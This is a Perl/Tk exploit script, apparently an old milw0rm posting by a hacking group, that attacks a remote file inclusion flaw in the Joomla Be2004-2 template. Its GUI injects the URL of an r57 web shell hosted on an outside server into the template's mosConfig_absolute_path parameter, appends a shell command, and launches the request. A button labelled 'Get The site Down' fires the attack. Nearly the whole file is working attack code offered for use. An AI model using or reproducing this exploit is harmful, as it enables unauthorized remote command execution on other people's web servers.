#!/usr/bin/perl

#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-                    - - [Team Hell] - -
#-   - - [The Best Arab Security And Hacking Team] - -
#-                   - - [Hack-Teach] - -
#-              - - [www.Hack-Teach.com] - -
#-              - - [ www.Hack-Teach.org] - -
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-   Joomla Template Be2004-2 (index.php) Remote File Include Exploit
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- [Script name: Be2004-2
#- [Script site: http://www.joomlaresource.com/joomla_downloads/Download/Joomla_Templates/be2004-2/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-            Coded And Found By Cold-z3ro
#-             Cold-z3ro[at]hotmail[dot]com
#-     www.Hack-Teach.com , www.Hack-Teach.org
#-     www.Hack-Teach.net , www.Hack-Teach.info
#+    \  Big thanks For You My Love Greeneyes_Amor  /
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#- Good Song :  http://www.s-rap-s.com/phlasteename.rm
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

use Tk;
use Tk::DialogBox;
use LWP::UserAgent;

$mw = new MainWindow(title => "Team Hell Crew :: Joomla Template Be2004-2 (index.php) Remote File Include Exploit :: by Cold z3ro ;-)  " );
$mw->geometry ( '500x300' ) ;
$mw->resizable(0,0);

$mw->Label(-text => 'Joomla Template Be2004-2 (index.php) Remote File Include Exploit', -font => '{Verdana} 7 bold',-foreground=>'blue')->pack();
$mw->Label(-text => '')->pack();

$fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
$fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;

$url = 'http://www.site.com/[ path ]/templates/be2004-2/index.php?mosConfig_absolute_path=';
$shell_path = 'http://nachrichtenmann.de/r57.txt?';
$cmd = 'ls -la';
$mysite = 'www.Hack-Teach.com';

$fleft->Label ( -text => 'Script Path: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'Shell Path: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$shell_path) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'Dork: inurll ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \be2004-2) ->pack ( -side => "top" , -anchor => 'w' ) ;


$fleft->Label ( -text => 'CMD: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$cmd) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fright->Label( -text => ' ')->pack();
$fleft->Label( -text => ' ')->pack();



$fright->Button(-text    => 'Break The Limits Of Security And Get The site Down - Exploit it',
               -relief => "groove",
               -width => '50',
               -font => '{Verdana} 8 bold',
               -activeforeground => 'red',
               -command => \&hackteach
              )->pack();

$fright->Button(-text    => 'www.Hack-Teach.com',
               -relief => "groove",
               -width => '30',
               -font => '{Verdana} 8 bold',
               -activeforeground => 'blue',
               -command => \&coldz3r0
              )->pack();

$fright->Label( -text => ' ')->pack();
$fright->Label( -text => 'Exploit Coded By Cold z3ro [Wasem898]', -font => '{Verdana} 7')->pack();
$fright->Label( -text => 'Team Hell Crew :: The Best Arab Security And Hacking Team', -font => '{Verdana} 7')->pack();
$fright->Label( -text => 'Cold-z3ro@hotmail.com', -font => '{Verdana} 7')->pack();
$fright->Label( -text => ' Long Life My Home Land Palestine', -font => '{Verdana} 7')->pack();
$fright->Label( -text => ' ~~\Big thanks For You My Love Greeneyes_Amor/~~', -font => '{Verdana} 7')->pack();
MainLoop();

sub hackteach()
{
$InfoWindow=$mw->DialogBox(-title   => 'Team Hell Crew :: Exploit by Cold z3ro ;-) ', -buttons => ["OK"]);
$InfoWindow->add('Label', -text => ' For help Cold-z3ro@hotmail.com #Team Hell', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'Team Hell Site: http://www.Hack-teach.com/', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'Greetz For my friends ;-)', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;

system("start $url$shell_path$cmd");
$InfoWindow->Show();
}

sub coldz3r0()
{
$InfoWindow=$mw->DialogBox(-title   => 'Thank U For Ur Trust Of Us', -buttons => ["OK"]);
$InfoWindow->add('Label', -text => 'You Welcome Brothers And Sister', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'My Site', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => ' Hack Teach', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'http://www.Hack-teach.com/', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => ' Or The Forum', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'http://www.Hack-teach.org/', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => 'Greetz For All who in my list in msn :) and My friends ;-)', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
system("start $mysite");
$InfoWindow->Show();
}

# milw0rm.com [2007-04-17]
